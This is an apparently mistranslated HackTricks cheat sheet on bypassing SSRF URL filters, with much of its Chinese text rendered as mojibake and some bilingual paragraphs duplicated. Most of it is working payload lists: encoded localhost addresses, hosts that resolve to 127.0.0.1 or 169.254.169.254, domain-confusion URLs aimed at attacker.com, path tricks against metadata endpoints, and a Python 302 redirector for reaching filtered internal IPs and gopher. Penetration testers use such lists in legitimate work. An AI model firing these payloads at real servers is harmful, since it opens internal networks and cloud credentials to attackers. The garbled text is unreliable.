# URLæ ¼å¼ç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

### æœ¬åœ°ä¸»æœº
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://â‘ â‘¡â‘¦.â“ª.â“ª.â“ª

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127ã€‚0ã€‚0ã€‚1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
åŸŸåè§£æå™¨

The domain parser is responsible for parsing the URL and extracting the domain name from it. It is an essential component in the SSRF vulnerability detection process.

### URL Format Bypasses

URL format bypasses are techniques used to bypass input validation and filtering mechanisms that are designed to prevent SSRF attacks. These techniques exploit the different ways in which URLs can be formatted and encoded.

#### IP Address Encoding

One common technique is to encode the IP address in the URL using different encoding schemes. For example, instead of using the standard decimal format (e.g., 192.168.0.1), the IP address can be encoded using hexadecimal, octal, or binary formats.

#### URL Encoding

URL encoding is another technique that can be used to bypass input validation. By encoding special characters in the URL, such as slashes (/), dots (.), and colons (:), it is possible to bypass filters that are not properly configured to handle encoded URLs.

#### URL Shorteners

URL shorteners can also be used to bypass input validation. By using a URL shortener service, an attacker can obfuscate the actual URL and make it more difficult for filters to detect and block SSRF attacks.

### Using the Burp-Encode-IP Extension

The Burp-Encode-IP extension provides several IP encoding options that can be used to bypass SSRF protections. These options include hexadecimal, octal, and binary encoding.

To use the extension, follow these steps:

1. Install the Burp-Encode-IP extension in Burp Suite.
2. Configure the extension by selecting the desired encoding options.
3. Use the extension to encode the IP address in the URL.
4. Test the URL to see if the SSRF protection can be bypassed.

By using the Burp-Encode-IP extension, you can easily test for SSRF vulnerabilities and bypass protections that rely on input validation and filtering.
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attackerã€‚com
â’¶â“‰â“‰â’¶â’¸â“€â’ºâ“¡.â’¸â“â“œ
```

```
â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾
â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’—
â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’°
â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰
â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢
â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿
```
### åŸŸåæ··æ·†

Domain confusion is a technique used to bypass SSRF protection mechanisms that rely on blacklisting or filtering specific domains. It involves using alternative representations of a domain name to deceive the protection mechanism and make it allow requests to a restricted domain.

åŸŸåæ··æ·†æ˜¯ä¸€ç§ç»•è¿‡åŸºäºé»‘åå•æˆ–è¿‡æ»¤ç‰¹å®šåŸŸåçš„SSRFä¿æŠ¤æœºåˆ¶çš„æŠ€æœ¯ã€‚å®ƒæ¶‰åŠä½¿ç”¨åŸŸåçš„æ›¿ä»£è¡¨ç¤ºæ–¹å¼æ¥æ¬ºéª—ä¿æŠ¤æœºåˆ¶ï¼Œä½¿å…¶å…è®¸å¯¹å—é™åŸŸåçš„è¯·æ±‚ã€‚

For example, if the protection mechanism blocks requests to the domain "example.com", an attacker can use alternative representations such as "exĞ°mple.com" (with a Cyrillic "Ğ°" instead of the Latin "a") or "ï½…xample.com" (with a fullwidth "ï½…" instead of the regular "e"). These alternative representations may look visually similar to the original domain, but they are treated as different domains by the protection mechanism.

ä¾‹å¦‚ï¼Œå¦‚æœä¿æŠ¤æœºåˆ¶é˜»æ­¢å¯¹åŸŸå"example.com"çš„è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ›¿ä»£è¡¨ç¤ºæ–¹å¼ï¼Œå¦‚"exĞ°mple.com"ï¼ˆä½¿ç”¨è¥¿é‡Œå°”å­—æ¯"a"ä»£æ›¿æ‹‰ä¸å­—æ¯"a"ï¼‰æˆ–"ï½…xample.com"ï¼ˆä½¿ç”¨å…¨è§’å­—ç¬¦"ï½…"ä»£æ›¿å¸¸è§„å­—ç¬¦"e"ï¼‰ã€‚è¿™äº›æ›¿ä»£è¡¨ç¤ºæ–¹å¼åœ¨è§†è§‰ä¸Šå¯èƒ½ä¸åŸå§‹åŸŸåç›¸ä¼¼ï¼Œä½†åœ¨ä¿æŠ¤æœºåˆ¶ä¸­è¢«è§†ä¸ºä¸åŒçš„åŸŸåã€‚

By using domain confusion, an attacker can bypass SSRF protection mechanisms that only consider exact domain matches. It is important for developers and security professionals to be aware of this technique and implement more robust protection mechanisms that can detect and block such alternative representations of domains.

é€šè¿‡ä½¿ç”¨åŸŸåæ··æ·†ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ä»…è€ƒè™‘ç²¾ç¡®åŸŸååŒ¹é…çš„SSRFä¿æŠ¤æœºåˆ¶ã€‚å¼€å‘äººå‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜éœ€è¦æ„è¯†åˆ°è¿™ç§æŠ€æœ¯ï¼Œå¹¶å®æ–½æ›´å¼ºå¤§çš„ä¿æŠ¤æœºåˆ¶ï¼Œä»¥ä¾¿èƒ½å¤Ÿæ£€æµ‹å’Œé˜»æ­¢è¿™ç§åŸŸåçš„æ›¿ä»£è¡¨ç¤ºæ–¹å¼ã€‚
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### è·¯å¾„å’Œæ‰©å±•åç»•è¿‡

å¦‚æœè¦æ±‚URLå¿…é¡»ä»¥è·¯å¾„æˆ–æ‰©å±•åç»“å°¾ï¼Œæˆ–è€…å¿…é¡»åŒ…å«è·¯å¾„ï¼Œæ‚¨å¯ä»¥å°è¯•ä»¥ä¸‹ç»•è¿‡æ–¹æ³•ä¹‹ä¸€ï¼š
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

å·¥å…·[**recollapse**](https://github.com/0xacb/recollapse)å¯ä»¥æ ¹æ®ç»™å®šçš„è¾“å…¥ç”Ÿæˆå˜ä½“ï¼Œå°è¯•ç»•è¿‡ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚æŸ¥çœ‹[**æ­¤æ–‡ç« **](https://0xacb.com/2022/11/21/recollapse/)ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚

### é€šè¿‡é‡å®šå‘ç»•è¿‡

å¯èƒ½æœåŠ¡å™¨æ­£åœ¨**è¿‡æ»¤SSRFçš„åŸå§‹è¯·æ±‚**ï¼Œä½†å´æ²¡æœ‰è¿‡æ»¤å¯èƒ½çš„**é‡å®šå‘**å“åº”ã€‚\
ä¾‹å¦‚ï¼Œä¸€ä¸ªå®¹æ˜“å—åˆ°SSRFæ”»å‡»çš„æœåŠ¡å™¨ï¼Œå¦‚`url=https://www.google.com/`ï¼Œå¯èƒ½æ­£åœ¨**è¿‡æ»¤urlå‚æ•°**ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ ä½¿ç”¨ä¸€ä¸ª[ç”¨äºå“åº”302çš„PythonæœåŠ¡å™¨](https://pastebin.com/raw/ywAUhFrv)åˆ°ä½ æƒ³è¦é‡å®šå‘çš„ä½ç½®ï¼Œä½ å¯èƒ½èƒ½å¤Ÿè®¿é—®è¢«è¿‡æ»¤çš„IPåœ°å€ï¼Œå¦‚127.0.0.1ï¼Œç”šè‡³è¢«è¿‡æ»¤çš„**åè®®**ï¼Œå¦‚gopherã€‚\
[æŸ¥çœ‹æ­¤æŠ¥å‘Šã€‚](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## è§£é‡Šçš„æŠ€å·§

### åæ–œæ æŠ€å·§

ç®€è€Œè¨€ä¹‹ï¼Œ_åæ–œæ æŠ€å·§_ ä¾èµ–äºä¸¤ä¸ªâ€œURLâ€è§„èŒƒä¹‹é—´çš„ä¸€ä¸ªç»†å¾®å·®åˆ«ï¼š[WHATWG URLæ ‡å‡†](https://url.spec.whatwg.org/#url-parsing)å’Œ[RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B)ã€‚RFC3986æ˜¯ä¸€ä¸ªé€šç”¨çš„ã€å¤šç”¨é€”çš„è§„èŒƒï¼Œç”¨äºå®šä¹‰_ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦_çš„è¯­æ³•ï¼Œè€ŒWHATWG URLæ ‡å‡†ä¸“é—¨é’ˆå¯¹Webå’ŒURLï¼ˆå®ƒä»¬æ˜¯URIçš„å­é›†ï¼‰ã€‚ç°ä»£æµè§ˆå™¨å®ç°äº†WHATWG URLæ ‡å‡†ã€‚

å®ƒä»¬éƒ½æè¿°äº†ä¸€ç§è§£æURI/URLçš„æ–¹å¼ï¼Œåªæœ‰ä¸€ä¸ªç»†å¾®çš„å·®åˆ«ã€‚WHATWGè§„èŒƒæè¿°äº†[ä¸€ä¸ªé¢å¤–çš„å­—ç¬¦](https://url.spec.whatwg.org/#authority-state)ï¼Œå³`\`ï¼Œå®ƒçš„è¡Œä¸ºä¸`/`ç±»ä¼¼ï¼šç»“æŸä¸»æœºåå’Œæƒé™ï¼Œå¹¶å¼€å§‹URLçš„è·¯å¾„ã€‚

![ä¸¤ä¸ªè§„èŒƒä»¥ä¸åŒæ–¹å¼è§£æç›¸åŒçš„URL](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### å…¶ä»–æ··æ·†

![](<../../.gitbook/assets/image (629).png>)

å›¾ç‰‡æ¥æºï¼š[https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
